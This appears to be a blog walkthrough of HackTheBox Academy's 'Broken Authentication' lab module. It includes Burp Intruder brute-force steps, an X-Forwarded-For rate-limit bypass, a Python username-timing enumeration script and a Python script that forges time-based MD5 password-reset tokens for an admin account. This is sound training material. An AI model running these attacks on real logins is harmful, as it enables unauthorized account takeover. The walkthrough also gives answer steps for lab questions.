---
title: "[HTB_Academy] Broken Authentication"
excerpt: "**Broken Authentication** Module Walkthrough - HackTheBox Academy"
header:
  overlay_image: /assets/images/HTB_broken_authentication/banner.png
  teaser: /assets/images/HTB_broken_authentication/upper.jpg
  og_image: /assets/images/HTB_broken_authentication/upper.jpg
categories:
  - HTB-Academy
  - Bug Bounty Hunter
tags:
  - HTB-Academy
  - Bug Bounty Hunter
  - Web
  - OWASP TOP 10
layout: single
toc: true
---
![image-center](\assets\images\HTB_broken_authentication\upper.jpg)
## Module Summary
This module covers common vulnerabilities and misconfigurations regarding Authentication that could be leveraged to gain unauthorized access to a web application. Specifically, in this module, we will cover:

  - An overview of authentication methods
  - Common protection mechanisms and possible bypasses
  - Attacks against login processes
  - Attacks against credential handling

## Default Credentials

> **Q. Inspect the login page and perform a bruteforce attack. What is the valid username?**

<div style="text-align: justify">1. If we access the target and see that it is a login page </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\1.png)

<div style="text-align: justify">2. We inspect the source code of the login page and see that the title of the login page displays some interesting information: WebAccess HMI/SCADA Software. </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\2.png)

<div style="text-align: justify">3. Doing a bit of searching on the internet, we found the following page: [SCADA HMI Username/Password](https://www.192-168-1-1-ip.co/router/advantech/advantech-webaccess-browser-based-hmi-and-scada-software/11215/)
in which there are several default "usernames" and "passwords" for SCADA. </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\3.png)

<div style="text-align: justify">4. A brute force attack is performed using the Burpsuite tool. To do this, we first capture the login request and send it to the Burpsuite Intruder: </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\4.png)

<div style="text-align: justify">5. In the intruder we select Cluster Bomb as Attack Type and the payload positions in the "Username" and "Password" values. </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\5.png)

<div style="text-align: justify">6. In the payloads tab we enter the usernames and password from step 3, both in payload set 1 and in payload set 2 and we execute the attack. </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\6.png)

<div style="text-align: justify">7. In the Burpsuite results we can see how one of the requests has a different length. </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\7.png)

<div style="text-align: justify">8. If we access the answer, we see how the session has been started correctly and therefore we already have the username of the question: </div><br>
![image-center](\assets\images\HTB_broken_authentication\Q1\8.png)

## Weak Bruteforce Protections

>**Q. Observe the web application based at subdirectory /question1/ and infer rate limiting. What is the wait time imposed after an attacker hits the limit? (round to a 10-second timeframe, e.g., 10 or 20)**

<div style="text-align: justify">1. We click on question1 and see that it is a login page.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\1.1.png)

<div style="text-align: justify">2. Since the question asks us for the waiting time, we send the request to the Intruder in a similar way to the previous question.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\1.2.png)

<div style="text-align: justify">3. In Intruder we select "Snyper" as Attack Type and only the username or password as payload (in this example we will use the username).</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\1.3.png)

<div style="text-align: justify">4. We introduce as payload a series of random values.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\1.4.png)

<div style="text-align: justify">5. We execute the attack and see how the length of the response changes at a given moment.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\1.5.png)

<div style="text-align: justify">6. Seeing the response of the first request with different length, we find out the timeout.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\1.6.png)

>**Q. Work on webapp at URL /question2/ and try to bypass the login form using one of the method showed. What is the flag?**

<div style="text-align: justify">1. Click on question2. Another login page.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\2.1.png)

<div style="text-align: justify">2. As a clue we know that the server does not trust our IP.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\2.2.png)

<div style="text-align: justify">3. We send the request to the Burpsuite Repeater.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\2.3.png)

<div style="text-align: justify">4. In the Repeater we add the "X-Forwarded-For" header with a specific IP (Hint: the server only trusts itself), send the request and get the flag.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q2\2.4.png)

## Brute Forcing Usernames

>**Q. Find the valid username on the web app based at the /question1/ subdirectory. PLEASE NOTE: Use the same wordlist for all four questions.**

<div style="text-align: justify">1. Click on question1.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\1.1.png)

<div style="text-align: justify">2. We capture the request with Burpsuite and send it to the Intruder.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\1.2.png)

<div style="text-align: justify">3. In the Intruder we select "Snyper" as the attack type and the payload position will be the username.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\1.3.png)

<div style="text-align: justify">4. As payload we use the following list which can be downloaded from the following link:</div> [SecLists](https://github.com/danielmiessler/SecLists)

```bash
cat /SecLists/Usernames/top-usernames-shortlist.txt
```

![image-center](\assets\images\HTB_broken_authentication\Q3\1.4.1.png)

![image-center](\assets\images\HTB_broken_authentication\Q3\1.4.2.png)

<div style="text-align: justify">5. We run the Intruder and see that there is a request with a different length.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\1.5.png)

<div style="text-align: justify">6. Reply with invalid user.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\1.6.png)

<div style="text-align: justify">7. Answer with different length. We see that the user is valid and therefore we have the answer to the question.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\1.7.png)

>**Q. Find the valid username for the web application based at subdirectory /question2/.**

<div style="text-align: justify">1. Click on question2.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\2.1.png)

<div style="text-align: justify">2. This is a more manual question. To find out what the username is, we must enter the usernames from the list of the first question one by one and see if anything changes in the requests captured in Burpsuite. In the following images we see how a request shows us a "wronguser" parameter and the other request the "validuser" parameter.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\2.2.png)

![image-center](\assets\images\HTB_broken_authentication\Q3\2.3.png)

>**Q. Find the valid account name for the web application based at subdirectory /question3/.**

<div style="text-align: justify">1. We access the target by clicking on question3 and we see that it is a login like the previous ones. In this case we ignore the hint and use the following python script. You have to change the IP and the PORT for the corresponding one.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\3.2.png)

```python
import sys
import requests
import os.path

# define target url, change as needed
url = "http://IP:PORT/question3/"

# define a fake headers to present ourself as Chromium browser, change if needed
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}

# define the string expected if valid account has been found. our basic PHP example replies with Welcome in case of success

valid = "Welcome"

"""
wordlist is expected as simple list, we keep this function to have it ready if needed.
for this test we are using /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
change this function if your wordlist has a different format
"""
def unpack(fline):
    userid = fline
    passwd = 'foobar'

    return userid, passwd

"""
our PHP example accepts requests via POST, and requires parameters as userid and passwd
"""
def do_req(url, userid, passwd, headers):
    data = {"userid": userid, "passwd": passwd, "submit": "submit"}
    res = requests.post(url, headers=headers, data=data)
    print("[+] user {:15} took {}".format(userid, res.elapsed.total_seconds()))

    return res.text

def main():
    # check if this script has been runned with an argument, and the argument exists and is a file
    if (len(sys.argv) > 1) and (os.path.isfile(sys.argv[1])):
        fname = sys.argv[1]
    else:
        print("[!] Please check wordlist.")
        print("[-] Usage: python3 {} /path/to/wordlist".format(sys.argv[0]))
        sys.exit()

    # open the file, this is our wordlist
    with open(fname) as fh:
        # read file line by line
        for fline in fh:
            # skip line if it starts with a comment
            if fline.startswith("#"):
                continue
            # use unpack() function to extract userid and password from wordlist, removing trailing newline
            userid, passwd = unpack(fline.rstrip())

            # call do_req() to do the HTTP request
            print("[-] Checking account {} {}".format(userid, passwd))
            res = do_req(url, userid, passwd, headers)

if __name__ == "__main__":
    main()
```

<div style="text-align: justify">2. We run the script and see that there is a request that takes more time and therefore it is the answer.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\3.3.png)

>**Q. Now find another way to discover the valid username for the web application based at subdirectory /question4/.**

<div style="text-align: justify">1. We access the objective by clicking on question4 and we see that there is a field to create an account, we click.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\4.1.png)

<div style="text-align: justify">2. It is a form with different fields, we fill them in and click on submit to be able to capture the request in Burpsuite.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\4.2.png)

<div style="text-align: justify">3. We send the request to the Intruder and select the username as the payload position. As payload we use the list from the first question.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\4.3.png)

<div style="text-align: justify">4. We run the Intruder and see that there is a request with a longer length.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\4.4.png)

<div style="text-align: justify">5. We check in the response that the user corresponding to the request sent exists and we obtain the answer to the question.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q3\4.5.png)

## Brute Forcing Passwords

>**Q. Using rockyou-50.txt as password wordlist and htbuser as the username, find the policy and filter out strings that don't respect it. What is the valid password for the htbuser account?**
<div style="text-align: justify">1. For this question we are entering different random passwords to check the password complexity filter. We see that a password with numbers and capital letters is requested. We use the following grep with rockyou-50.txt to get a list that we will use in the Intruder.</div><br>

```bash
grep '[[:upper:]]' /home/marcos/htb-academy/broken_authentication/SecLists-master/Passwords/Leaked-Databases/rockyou-50.txt | grep -E '[0-9]{1,4}'
```

![image-center](\assets\images\HTB_broken_authentication\Q4\1.png)

![image-center](\assets\images\HTB_broken_authentication\Q4\2.png)

<div style="text-align: justify">2. Since there is a timeout when entering the wrong password multiple times, we run the intruder in chunks (4 or 5 payloads each time).</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q4\3.png)

<div style="text-align: justify">3. As the first 5 payloads have not worked, we remove them from the payload list and run the Intruder again.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q4\4.png)

<div style="text-align: justify">4. The previous step is repeated until we see the length of our request change.</div><br>
![image-center](\assets\images\HTB_broken_authentication\Q4\5.png)




## Predictable Reset Token

>**Q. Create a token on the web application exposed at subdirectory /question1/ using the *Create a reset token for htbuser* button. Within an interval of +-1 second a token for the htbadmin user will also be created. The algorithm used to generate both tokens is the same as the one shown when talking about the Apache OpenMeeting bug. Forge a valid token for htbadmin and login by pressing the "Check" button. What is the flag?**

<div style="text-align: justify">1. To solve this question we need to modify the reset_token_time.py script to generate tokens within +/- two seconds of the time shown in the target. For this we access the following web page</div><br>
[EpochConverter](https://www.epochconverter.com/)

<div style="text-align: justify">2. We introduce the time that the target "And has been created at" shows us and we generate the "Epoch timestamp in milliseconds". We do this process with +/-2 seconds and fill in the "now", "start_time" and "end_time" variables in the script.</div>

```python
#!/usr/bin/python3

from hashlib import md5
import requests
from sys import exit
from time import time

# Change the url to your target / victim
url = "http://IP:PORT/question1/"

# To have a wide window try to bruteforce starting from 1050 seconds ago till 1050 seconds after.
# Change now and username variables as needed. IMPORTANT! the value for now has to be epoch time
# stamp in milliseconds, example 1654627487000 and not epoch timestamp, example 1654627487.

now        = 1675437483000
start_time = 1675438899000 #-2 seconds
end_time   = 1675438903000 #+2 seconds
fail_text  = "Wrong token"
username   = "htbadmin"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, end_time + 1):
    # get token md5
    timestamp = str(x)
    md5_token = md5((username+timestamp).encode()).hexdigest()
    data = {
        "submit": "check",
        "token": md5_token
    }

    print("checking {} {}".format(str(x), md5_token))

    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()
```

<div style="text-align: justify">3. We run the script, wait and get the flag.</div>

```sh
python3 user.py
```

![image-center](\assets\images\HTB_broken_authentication\Q5\1.png)

>**Q. Request a reset token for htbuser and find the encoding algorithm, then request a reset token for htbadmin to force a password change and forge a valid temp password to login. What is the flag?**

## Guessable Answers

>**Q. Reset the htbadmin user's password by guessing one of the questions. What is the flag?**

## Username Injection

>**Q. Login with the credentials "htbuser:htbuser" and abuse the reset password function to escalate to "htbadmin" user. What is the flag?**

## Brute Forcing Cookies

>**Q. Tamper the session cookie for the application at subdirectory /question1/ to give yourself access as a super user. What is the flag?**

>**Q. Log in to the target application and tamper the rememberme token to give yourself super user privileges. After escalating privileges, submit the flag as your answer.**

## Skill Assessment - Broken Authentication

>**Q. Assess the web application and use various techniques to escalate to a privileged user and find a flag in the admin panel. Submit the contents of the flag as your answer.**